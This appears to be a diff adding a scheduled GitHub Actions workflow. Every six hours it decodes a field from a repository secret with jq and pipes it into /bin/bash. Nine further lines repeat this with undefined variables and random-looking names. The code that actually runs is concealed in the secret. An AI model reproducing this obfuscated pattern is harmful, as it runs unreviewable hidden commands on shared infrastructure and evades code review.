@@ -1,0 +1,26 @@
+name: chouxindingshen
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chouxindingshen
+        env:
+          mobqx59: ${{ secrets.mobqx59 }}
+        run: |
+          echo $mobqx59 | jq -r .ddbm34823 | /bin/bash
+          echo $olszj3 | jq -r .bl4 | /bin/bash
+          echo $ajvj98 | jq -r .qik97525 | /bin/bash
+          echo $nzzvn62815 | jq -r .nd518 | /bin/bash
+          echo $gk12 | jq -r .xc7268 | /bin/bash
+          echo $fvhlo14 | jq -r .i9 | /bin/bash
+          echo $e72610 | jq -r .tes60 | /bin/bash
+          echo $sfdte70 | jq -r .zdza168 | /bin/bash
+          echo $swk0654 | jq -r .qxsvv516 | /bin/bash
+          echo $adbm10369 | jq -r .ut11 | /bin/bash
+
